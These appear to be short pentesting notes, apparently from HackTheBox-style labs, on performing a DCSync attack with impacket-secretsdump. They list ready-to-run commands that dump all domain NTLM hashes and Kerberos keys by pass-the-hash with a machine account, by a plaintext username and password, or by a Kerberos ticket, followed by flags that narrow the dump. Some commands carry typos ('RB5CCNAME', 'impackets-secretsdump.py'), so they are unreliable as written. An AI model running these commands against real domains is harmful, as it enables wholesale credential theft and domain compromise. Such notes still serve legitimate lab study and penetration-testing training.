

What DCSync will give you:

- All domain user hashes (NTLM)
- Kerberos keys
- Potentially sensitive domain data

**Note:** The machine account `FileServer$` needs to have the necessary permissions to perform DCSync (usually only Domain Admins, Enterprise Admins, and Domain Controllers have this by default). If it doesn't have permissions, you might need to first compromise an account that does



```
impacket-secretsdump SOUPEDECODE.LOCAL/FileServer\$@DC01.SOUPEDECODE.LOCAL -hashes :e41da7e79a4c76dbd9cf79d1cb325559
```

```
impacket-secretsdump -just-dc SOUPEDECODE.LOCAL/FileServer\$@DC01.SOUPEDECODE.LOCAL -hashes :e41da7e79a4c76dbd9cf79d1cb325559
```

```
impacket-secretsdump administrator.htb/ethan:limpbizkit@10.129.8.127
```



# With a ticket (ticket.cacche)

```
RB5CCNAME=ticket.ccache python3 impackets-secretsdump.py -k -no-pass g0.flight.htb 
```

This will also perform a DCsync attack and print all the ntml hashes from NTDS.NIT


* The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
* We can use the `-just-dc-ntlm` flag if we only want NTLM hashes
* specify `-just-dc-user <USERNAME>` to only extract data for a specific user
* Use `-pwd-last-set` to see when each account's password was last changed
* `-history` if we want to dump password history,
* The `-user-status` is another helpful flag to check and see if a user is disabled.